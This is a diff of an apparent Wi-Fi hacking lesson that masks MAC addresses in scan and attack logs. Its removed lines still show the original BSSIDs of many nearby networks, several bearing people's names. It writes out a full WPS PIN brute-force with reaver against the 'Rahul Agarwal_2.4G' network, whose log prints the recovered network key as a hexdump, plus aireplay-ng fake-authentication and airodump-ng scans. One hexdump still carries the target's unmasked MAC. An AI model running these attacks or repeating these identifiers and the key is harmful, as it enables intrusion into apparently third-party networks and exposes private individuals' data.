@@ -55,33 +55,33 @@ next: "lesson-05"
     root@kali:~# wash --interface wlan0
     BSSID               Ch  dBm  WPS  Lck  Vendor    ESSID
     --------------------------------------------------------------------------------
-    CE:82:A9:6D:BB:76    1  -62  2.0  No             Avik
-    B4:3D:08:2D:91:41    1  -50  2.0  No   RealtekS  Rahul Agarwal_2.4G
-    32:42:40:E6:AE:18    5  -70  2.0  No             ZTE_2.4G_cCGVZc
-    34:60:F9:84:F1:AF    6  -64  2.0  No   RalinkTe  Mids-44
-    6C:4F:89:16:4F:F9    6  -52  2.0  No             Airtel_Sathvik
-    30:68:93:B4:2F:82    9  -66  2.0  No   AtherosC  abhilash
-    F0:A7:31:A8:DF:7B   10  -70  2.0  No   Broadcom  Nidhi
-    3E:9D:4E:0A:CA:BA   11  -66  2.0  No             Sahil
-    96:E3:EE:24:CD:CA    7  -72  2.0  No             ZTE_2.4G_PHrKyC
-    44:95:3B:86:E6:F0    7  -70  1.0  No   RalinkTe  RH-2.4G-86E6F0
-    5C:A6:E6:43:31:FE   10  -62  2.0  No   RalinkTe  Winterfell
-    3C:6A:D2:6D:04:2E    8  -72  2.0  No   AtherosC  Toothless
-    BA:DD:71:A2:6B:FE    9  -80  2.0  No             ZTE_2.4G_SDb3xT
-    BA:DD:71:A1:23:90    9  -74  2.0  No             Goldenenclave 101 2.4G
-    C4:95:4D:37:AE:61    1  -70  1.0  No   RalinkTe  JioFiber-82hh3
-    3C:6A:D2:70:34:82    5  -70  2.0  Yes  RalinkTe  Michelangelo
-    44:95:3B:9E:26:10    1  -70  1.0  No   RalinkTe  RH-2.4G-9E2610
-    18:D6:C7:82:EA:46   12  -82  2.0  No   RalinkTe  DAS-TP-LINK_EA46
-    44:95:3B:88:24:70    1  -72  1.0  No   RalinkTe  RH-2.4G-882470
-    5E:3A:3D:A3:26:B7    3  -72  2.0  No             ZTE_2.4G_XdeD6e
-    44:95:3B:94:8B:B0   13  -70  1.0  No   RalinkTe  RH-2.4G-948BB0
-    BA:DD:71:A4:BB:6A    9  -74  2.0  No             Aasra pg 4th floor
-    3C:64:CF:3B:44:3E    5  -68  2.0  No   AtherosC  McDeNviUber
-    8C:A3:99:46:0D:AA   11  -84  2.0  No   Broadcom  JioFiber-gryff
-    BA:DD:71:E6:A6:BC    8  -74  2.0  No             ZTE_2.4G_3DeKcF
-    96:E3:EE:24:6C:F8    4  -78  2.0  No             ZTE_2.4G_wzHhQ9
-    44:95:3B:BE:DE:B0    9  -78  1.0  No   RalinkTe  RH-2.4G-BEDEB0
+    XX:XX:XX:XX:XX:XX    1  -62  2.0  No             Avik
+    XX:XX:XX:XX:XX:XX    1  -50  2.0  No   RealtekS  Rahul Agarwal_2.4G
+    XX:XX:XX:XX:XX:XX    5  -70  2.0  No             ZTE_2.4G_cCGVZc
+    XX:XX:XX:XX:XX:XX    6  -64  2.0  No   RalinkTe  Mids-44
+    XX:XX:XX:XX:XX:XX    6  -52  2.0  No             Airtel_Sathvik
+    XX:XX:XX:XX:XX:XX    9  -66  2.0  No   AtherosC  abhilash
+    XX:XX:XX:XX:XX:XX   10  -70  2.0  No   Broadcom  Nidhi
+    XX:XX:XX:XX:XX:XX   11  -66  2.0  No             Sahil
+    XX:XX:XX:XX:XX:XX    7  -72  2.0  No             ZTE_2.4G_PHrKyC
+    XX:XX:XX:XX:XX:XX    7  -70  1.0  No   RalinkTe  RH-2.4G-86E6F0
+    XX:XX:XX:XX:XX:XX   10  -62  2.0  No   RalinkTe  Winterfell
+    XX:XX:XX:XX:XX:XX    8  -72  2.0  No   AtherosC  Toothless
+    XX:XX:XX:XX:XX:XX    9  -80  2.0  No             ZTE_2.4G_SDb3xT
+    XX:XX:XX:XX:XX:XX    9  -74  2.0  No             Goldenenclave 101 2.4G
+    XX:XX:XX:XX:XX:XX    1  -70  1.0  No   RalinkTe  JioFiber-82hh3
+    XX:XX:XX:XX:XX:XX    5  -70  2.0  Yes  RalinkTe  Michelangelo
+    XX:XX:XX:XX:XX:XX    1  -70  1.0  No   RalinkTe  RH-2.4G-9E2610
+    XX:XX:XX:XX:XX:XX   12  -82  2.0  No   RalinkTe  DAS-TP-LINK_EA46
+    XX:XX:XX:XX:XX:XX    1  -72  1.0  No   RalinkTe  RH-2.4G-882470
+    XX:XX:XX:XX:XX:XX    3  -72  2.0  No             ZTE_2.4G_XdeD6e
+    XX:XX:XX:XX:XX:XX   13  -70  1.0  No   RalinkTe  RH-2.4G-948BB0
+    XX:XX:XX:XX:XX:XX    9  -74  2.0  No             Aasra pg 4th floor
+    XX:XX:XX:XX:XX:XX    5  -68  2.0  No   AtherosC  McDeNviUber
+    XX:XX:XX:XX:XX:XX   11  -84  2.0  No   Broadcom  JioFiber-gryff
+    XX:XX:XX:XX:XX:XX    8  -74  2.0  No             ZTE_2.4G_3DeKcF
+    XX:XX:XX:XX:XX:XX    4  -78  2.0  No             ZTE_2.4G_wzHhQ9
+    XX:XX:XX:XX:XX:XX    9  -78  1.0  No   RalinkTe  RH-2.4G-BEDEB0
     ```
 
 - Hence, now we know we have a WPS enabled network, we can use the `reaver` tool to brute-force the WPS PIN and recover the WPA/WPA2 key.
@@ -112,14 +112,14 @@ next: "lesson-05"
         <summary>reaver logs</summary>
 
     ```bash
-    root@kali:~# reaver --bssid B4:3D:08:2D:91:41 --channel 1 --interface wlan0 -vvv --no-associate
+    root@kali:~# reaver --bssid XX:XX:XX:XX:XX:XX --channel 1 --interface wlan0 -vvv --no-associate
 
     Reaver v1.6.6 WiFi Protected Setup Attack Tool
     Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>
 
     [+] Switching wlan0 to channel 1
-    [+] Waiting for beacon from B4:3D:08:2D:91:41
-    [+] Received beacon from B4:3D:08:2D:91:41
+    [+] Waiting for beacon from XX:XX:XX:XX:XX:XX
+    [+] Received beacon from XX:XX:XX:XX:XX:XX
     [+] Vendor: RealtekS
     WPS: A new PIN configured (timeout=0)
     WPS: UUID - hexdump(len=16): [NULL]
@@ -134,7 +134,7 @@ next: "lesson-05"
     WPS: Leave wps_cg_set_sel_reg early
     WPS: return from wps_selected_registrar_changed
     [+] Trying pin "12345670"
-    [+] Associated with B4:3D:08:2D:91:41 (ESSID: Rahul Agarwal_2.4G)
+    [+] Associated with XX:XX:XX:XX:XX:XX (ESSID: Rahul Agarwal_2.4G)
     [+] Sending EAPOL START request
     send_packet called from send_eapol_start() send.c:48
     [+] Received deauth request
@@ -173,7 +173,7 @@ next: "lesson-05"
     WPS: Parsed WSC_MSG
     WPS: Received M1
     WPS: UUID-E - hexdump(len=16): 63 04 12 53 10 19 20 06 12 28 b4 3d 08 2d 91 41
-    WPS: Enrollee MAC Address b4:3d:08:2d:91:41
+    WPS: Enrollee MAC Address XX:XX:XX:XX:XX:XX
     WPS: Enrollee Nonce - hexdump(len=16): f2 15 8e fc e7 95 d5 93 91 19 52 41 49 9f 8f cd
     WPS: Enrollee Authentication Type flags 0x21
     WPS: No match in supported authentication types (own 0x0 Enrollee 0x21)
@@ -292,7 +292,7 @@ next: "lesson-05"
     WPS: Leave wps_cg_set_sel_reg early
     WPS: return from wps_selected_registrar_changed
     [+] Trying pin "12345670"
-    [+] Associated with B4:3D:08:2D:91:41 (ESSID: Rahul Agarwal_2.4G)
+    [+] Associated with XX:XX:XX:XX:XX:XX (ESSID: Rahul Agarwal_2.4G)
     [+] Sending EAPOL START request
     send_packet called from send_eapol_start() send.c:48
     send_packet called from resend_last_packet() send.c:161
@@ -340,7 +340,7 @@ next: "lesson-05"
     WPS: Parsed WSC_MSG
     WPS: Received M1
     WPS: UUID-E - hexdump(len=16): 63 04 12 53 10 19 20 06 12 28 b4 3d 08 2d 91 41
-    WPS: Enrollee MAC Address b4:3d:08:2d:91:41
+    WPS: Enrollee MAC Address XX:XX:XX:XX:XX:XX
     WPS: Enrollee Nonce - hexdump(len=16): d9 ec e0 c5 7d 06 11 d0 9c 36 81 b7 24 03 ad 20
     WPS: Enrollee Authentication Type flags 0x21
     WPS: No match in supported authentication types (own 0x0 Enrollee 0x21)
@@ -493,7 +493,7 @@ next: "lesson-05"
     WPS: Encryption Type: 0x8
     WPS: Network Key Index: 1
     WPS: Network Key - hexdump(len=10): 39 35 39 39 36 31 33 33 39 37
-    WPS: MAC Address b4:3d:08:2d:91:41
+    WPS: MAC Address XX:XX:XX:XX:XX:XX
     WPS: Update local configuration based on the AP configuration
     WPS: Processing AP Settings
     WPS: SSID - hexdump_ascii(len=18):
@@ -503,7 +503,7 @@ next: "lesson-05"
     WPS: Encryption Type: 0x8
     WPS: Network Key Index: 1
     WPS: Network Key - hexdump(len=10): 39 35 39 39 36 31 33 33 39 37
-    WPS: MAC Address b4:3d:08:2d:91:41
+    WPS: MAC Address XX:XX:XX:XX:XX:XX
     WPS: Update local configuration based on the AP configuration
     WPS: WPS_CONTINUE, Freeing Last Message
     WPS: WPS_CONTINUE, Saving Last Message
@@ -536,8 +536,8 @@ next: "lesson-05"
         <summary> aireplay-ng logs </summary>
 
         ```bash
-        root@kali:~# aireplay-ng --fakeauth 30 -a B4:3D:08:2D:91:41 -h 8C:90:2D:CA:CE:44 wlan0
-        13:43:55  Waiting for beacon frame (BSSID: B4:3D:08:2D:91:41) on channel 1
+        root@kali:~# aireplay-ng --fakeauth 30 -a XX:XX:XX:XX:XX:XX -h XX:XX:XX:XX:XX:XX wlan0
+        13:43:55  Waiting for beacon frame (BSSID: XX:XX:XX:XX:XX:XX) on channel 1
 
         13:43:55  Sending Authentication Request (Open System) [ACK]
         13:43:55  Authentication successful
@@ -571,17 +571,17 @@ next: "lesson-05"
   
    BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
   
-   C4:95:4D:37:AE:61   -1        0        1    0  11   -1   WPA              <length:  0>         
-   E4:FA:C4:3C:9F:0E   -1        0        2    0  36   -1   WPA              <length:  0>         
-   E4:FA:C4:0C:F3:33  -72        0        0    0  -1   -1                    <length:  0>         
-   44:95:3B:88:14:C1  -74       10        0    0 153  866   WPA2 CCMP   PSK  Goldenenclave603     
-   B4:3D:08:2D:91:40  -80       10        0    0 149  866   WPA2 CCMP   PSK  Rahul Agarwal_5G     
-   30:DE:4B:B5:3C:19  -82       15        0    0  44  390   WPA2 CCMP   PSK  RakshaDeepak_5g      
-   6C:4F:89:16:4F:FA  -80       16        0    0  40  866   WPA2 CCMP   PSK  Airtel_Sathvik
-   CE:82:A9:6D:BB:76  -59        5        0    0  11  260   WPA2 CCMP   PSK  Avik                 
-   B4:3D:08:2D:91:41  -54        4        0    0  10  270   WPA2 CCMP   PSK  Rahul Agarwal_2.4G   
-   20:0C:86:43:98:98  -76        5        0    0  13  270   WPA2 CCMP   PSK  SM-2.4G              
-   22:0C:86:53:98:98  -66        6        0    0  13  270   WPA2 CCMP   PSK  www.excitel.com      
+   XX:XX:XX:XX:XX:XX   -1        0        1    0  11   -1   WPA              <length:  0>         
+   XX:XX:XX:XX:XX:XX   -1        0        2    0  36   -1   WPA              <length:  0>         
+   XX:XX:XX:XX:XX:XX  -72        0        0    0  -1   -1                    <length:  0>         
+   XX:XX:XX:XX:XX:XX  -74       10        0    0 153  866   WPA2 CCMP   PSK  Goldenenclave603     
+   XX:XX:XX:XX:XX:XX  -80       10        0    0 149  866   WPA2 CCMP   PSK  Rahul Agarwal_5G     
+   XX:XX:XX:XX:XX:XX  -82       15        0    0  44  390   WPA2 CCMP   PSK  RakshaDeepak_5g      
+   XX:XX:XX:XX:XX:XX  -80       16        0    0  40  866   WPA2 CCMP   PSK  Airtel_Sathvik
+   XX:XX:XX:XX:XX:XX  -59        5        0    0  11  260   WPA2 CCMP   PSK  Avik                 
+   XX:XX:XX:XX:XX:XX  -54        4        0    0  10  270   WPA2 CCMP   PSK  Rahul Agarwal_2.4G   
+   XX:XX:XX:XX:XX:XX  -76        5        0    0  13  270   WPA2 CCMP   PSK  SM-2.4G              
+   XX:XX:XX:XX:XX:XX  -66        6        0    0  13  270   WPA2 CCMP   PSK  www.excitel.com      
   ```
   
 - So, as we can see, we have a lot of Networks in the area using WPA2 Encryption. The next thing we will do is we will capture the packets on the target network of our choice using `airodump-ng`.
